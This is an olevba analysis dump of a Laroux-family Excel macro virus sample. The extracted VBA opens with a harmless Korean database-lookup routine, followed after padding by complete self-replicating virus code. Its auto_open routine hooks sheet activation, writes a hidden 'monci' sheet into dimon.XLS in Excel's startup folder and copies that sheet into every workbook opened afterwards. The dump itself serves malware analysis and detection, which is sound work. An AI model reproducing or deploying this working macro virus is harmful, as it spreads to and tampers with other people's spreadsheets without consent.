olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Laroux-based-92a133afb8aab1ae93f36615576dd8c8fc2c3a34
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO monci.bas 
in file: Virus.MSExcel.Laroux-based-92a133afb8aab1ae93f36615576dd8c8fc2c3a34 - OLE stream: '_VBA_PROJECT_CUR/VBA/monci'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Data_Search()

'º¯¼ö ¼±¾ð
 Dim mydb As Database
 Dim myrstable As Recordset
 Dim myfield As Field
 Dim myrange As Range
 Dim mycurdir As String
 Dim myfilename As String
 Dim mypath As String
 
 Dim aaa As String
 
 '°æ·Î ÀÛ¼º
'  mycurdir = Application.Workbooks("Á¶¾÷ÇöÈ².xls").Path
'  myfilename = "°¡°èºÎ1.mdb"
'  mypath = mycurdir & "\" & myfilename
  
  'µ¥ÀÌÅÍº£ÀÌ½º ÁØºñ ÇÊµå´Â Ãß°¡ÇÏ¿© »ç¿ë
'  Set mydb = opendatabase(mypath)
  Set mydb = opendatabase("c:\¾Ï¸ð´Ï¾Æ\°¡°èºÎ1.mdb")
  Set myrstable = mydb.openrecordset("°¡°èºÎ", dbopendynaset)
'  Set myfield = myrstable.fields("Àû¿ë")
  
  aaa = "¿ø°í·á"
  
  myrstable.FindFirst "Àû¿ë = '& aaa & '"
  
  
  MsgBox myrstable.Fields("¼öÀÔ")
  
  MsgBox Format(Now, "yyyy.  m. dd.")
  
  
  
'   Data1.Recordset.FindFirst "date = #" & t_date & "#  "
' i = 0
' If Data1.Recordset.NoMatch Then

'  Set myrange = Range("A1")
'  myrstable.movefirst
  
'  Do Until myrstable.EOF
'    myrange.Offset(0, 0).Value = myfield.Value
'    Set myrange = myrange.Offset(1, 0)
'    myrstable.movenext
'  Loop
  
  mydb.Close

End Sub


















































Sub auto_open()
Attribute auto_open.VB_ProcData.VB_Invoke_Func = " \n14"
    Application.OnSheetActivate = "vrs"
End Sub

Sub vrs()
Attribute vrs.VB_ProcData.VB_Invoke_Func = " \n14"
    c$ = Application.StartupPath
    m$ = Dir(c$ & "\" & "dimon.XLS")
    If m$ = "dimon.XLS" Then p = 1 Else p = 0
    If ActiveWorkbook.Modules.Count > 0 Then w = 1 Else w = 0
    whichfile = p + w * 10
    
Select Case whichfile
    Case 10
    Application.ScreenUpdating = False
    n4$ = ActiveWorkbook.Name
    Sheets("monci").Visible = True
    Sheets("monci").Select
    Sheets("monci").Copy
    With ActiveWorkbook
        .Title = ""
        .Subject = ""
        .Author = ""
        .Keywords = ""
        .Comments = ""
    End With
    NewName$ = ActiveWorkbook.Name
    c4$ = CurDir()
    ChDir Application.StartupPath
    ActiveWindow.Visible = False
    Workbooks(NewName$).SaveAs FileName:=Application.StartupPath & "/" & "dimon.XLS", FileFormat:=xlNormal _
        , Password:="", WriteResPassword:="", ReadOnlyRecommended:= _
        False, CreateBackup:=False
    ChDir c4$
    Workbooks(n4$).Sheets("monci").Visible = False
    Application.OnSheetActivate = ""
    Application.ScreenUpdating = True
    Application.OnSheetActivate = "dimon.xls!vrs"
    Case 1
    Application.ScreenUpdating = False
    n4$ = ActiveWorkbook.Name
    p4$ = ActiveWorkbook.Path
    s$ = Workbooks(n4$).Sheets(1).Name
    If s$ <> "monci" Then
        Workbooks("dimon.XLS").Sheets("monci").Copy before:=Workbooks(n4$).Sheets(1)
        Workbooks(n4$).Sheets("monci").Visible = False
    Else
    End If
    Application.OnSheetActivate = ""
    Application.ScreenUpdating = True
    Application.OnSheetActivate = "dimon.xls!vrs"
    Case 11
    Dim msg, Style, Title, Respon
    t$ = Time()
Rem     If t$ > "21:00:00" Then
Rem     msg = "Maaf, Sekarang Waktunya Untuk Berisitrahat"
Rem     style = vbOKOnly
Rem     title = "WARNING !!!"
Rem     Respon = MsgBox(msg, style, title)
Rem     If Respon = vbOK Then
Rem     Application.Quit
Rem     End If
Rem     Else
Rem     End If
    Case Else
End Select
End Sub
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     13 BOUNDSHEET : Sheet Information - Visual Basic module, visible -  monc
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sophos 
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sophos 
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sophos 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |auto_open           |Runs when the Excel Workbook is opened       |
+----------+--------------------+---------------------------------------------+

